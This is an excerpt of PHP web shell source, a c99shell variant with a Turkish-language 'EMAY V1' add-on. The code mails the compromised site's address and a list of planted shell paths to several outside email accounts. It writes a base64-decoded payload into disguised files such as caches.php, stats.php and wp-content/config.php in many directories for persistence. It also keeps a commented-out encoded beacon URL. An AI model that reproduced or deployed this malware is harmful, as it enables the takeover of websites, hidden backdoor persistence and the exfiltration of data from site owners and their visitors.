...
$login = "hecker";
$pass = "";
$md5_pass = "e96c8308cd0b058baf79511d2b747b68";
$host_allow = array(
    "*"
);
$login_txt = "Restricted area";
$accessdeniedmess = "<a href=\"https://github.com/phpwebshell/c99shell\">c99shell v." . $shver . "</a>: access denied";
$gzipencode = true;
$updatenow = false;
$c99sh_updateurl = "https://github.com/phpwebshell/c99shell/";
$c99sh_sourcesurl = "https://github.com/phpwebshell/c99shell/";
$filestealth = true;
...
{
    exit("<a href=\"https://github.com/phpwebshell/c99shell\">c99shell</a>: Access Denied - your host (" . getenv("REMOTE_ADDR") . ") not allow");
}
if (!empty($login))
{
    if (empty($md5_pass))
    ...
    if (!function_exists("mysql_dump"))
    {
        function mysql_dump($set)
        {
            ...
            $out = "# Dumped by C99Shell.SQL v. " . $shver . "
					# Home page: https://github.com/phpwebshell/c99shell
					#
					# Host settings:
...
if ($act == "about")
{
    echo "<center><b>Credits:<br><br>Kudos to the &quot;Original Creators&quot; of C99Shell.<br><br>and <u>KaizenLouie</u> for Latest safe-build and update for PHP 7.<br><br>Thanks to all who reported the bugs.<br>If there are more bugs, please create an issue in https://github.com/phpwebshell/c99shell </b>";
} ?>
...
$logadresi= $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$logadresi1="
/cacher/caches.php,
/cacher/creates.php,
/cacher/stats.php,
...
/stats/creates.php,
/stats/stats.php,
/wp-content/caches.php,
/wp-content/creates.php,
/wp-content/stats.php,
/wp-content/config.php,
/error_log/caches.php,
/error_log/creates.php,
/error_log/stats.php,
/error_log/error.php,";
$message= $logadresi." 
---------------------EMAY V1------------------------------- ".$logadresi1."
---------------------TUM KLASORLERE SHELL YUKLENDI-------------------------------
---------------------TUM KLASORLERE /caches/caches.php /stats/stats.php ve caches.php , creates.php , stats.php her dizin YUKLENDI-------------------------------
";
$subject= "EMAY V1 LOG";
$headers = "EMAY V1 LOG";


if(empty($_SESSION['fonksiyon'])){

mail("emayprojem@gmail.com", $subject, $message, $headers);
mail("emayv111@gmail.com", $subject, $message, $headers);
mail("emayv1@yandex.com", $subject, $message, $headers);
mail("emayv1@yahoo.com", $subject, $message, $headers);
$_SESSION['fonksiyon'] = true;

}


$code = base64_decode("");
...
if ($handle = opendir("$dizin") or die ("Dizin acilamadi!")) {
    ...
    while (false && false !== ($file = readdir($handle))) {
    $filetype = ext($file);
...
$dizinler = array($file);
 ...
 $hepsineolustur = $son."/caches";  // 
 $hepsineolustur2 = $son."/stats"; // 
mkdir($hepsineolustur);
mkdir($hepsineolustur2);



    $dosya = $son."/creates.php"; // creates
	touch($son."creates.php"); // 
	$dosya = fopen($dosya, 'w');
	fwrite($dosya, $code);
	fclose($dosya);


  $dosya = $son."/stats.php"; // creates.p
    touch($son."stats.php"); // 
    $dosya = fopen($dosya, 'w');
    fwrite($dosya, $code);
    fclose($dosya);

    $dosya = $son."/caches.php"; // 
    touch($son."caches.php"); // 
    $dosya = fopen($dosya, 'w');
    fwrite($dosya, $code);
    fclose($dosya);
    ...
    $hepsidosya = $hepsineolustur."/caches.php";  // 
    touch($son."/caches.php"); //
    $dosya = fopen($hepsidosya, 'w');
    fwrite($dosya, $code); // 
    fclose($dosya);

    $hepsidosya1 = $hepsineolustur2."/stats.php"; //
    touch($son."/stats.php"); // 
    $dosya = fopen($hepsidosya1, 'w');
    fwrite($dosya, $code); //
    fclose($dosya);
...
$olustur = $loc."/wp-contents"; // wp-contents
$olustur1 = $loc."/emay"; // emay kl
$olustur2 = $loc."/cacher"; // cach
$olustur3 = $loc."/error_log"; // cach
...
touch($olustur."/config.php");
touch($olustur."/index.php");

    $dosyaana = fopen($olustur."/config.php", 'w');
    fwrite($dosyaana, $code); //
    fclose($dosyaana);

touch($olustur1."/emay.php");
touch($olustur1."/index.php");

 $dosyaana1 = fopen($olustur1."/emay.php", 'w');
    fwrite($dosyaana1, $code); //
    fclose($dosyaana1);


touch($olustur2."/caches.php");
touch($olustur2."/index.php");

 $dosyaana2 = fopen($olustur2."/caches.php", 'w');
    fwrite($dosyaana2, $code); //
    fclose($dosyaana2);

    touch($olustur3."/error.php");
touch($olustur3."/index.php");

 $dosyaana3 = fopen($olustur3."/error.php", 'w');
    fwrite($dosyaana3, $code); //
    fclose($dosyaana3);
...
<?php
// from movitz: removed beacon
// echo '<link rel="stylesheet" type="text/css" href="'.base64_decode("aHR0cHM6Ly9jOTlzaGVsbC5uZXQvL3dlYnNoZWxsL2VtYXkvZW1heS5waHA/dXJsPQ==").$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'].'">';?>
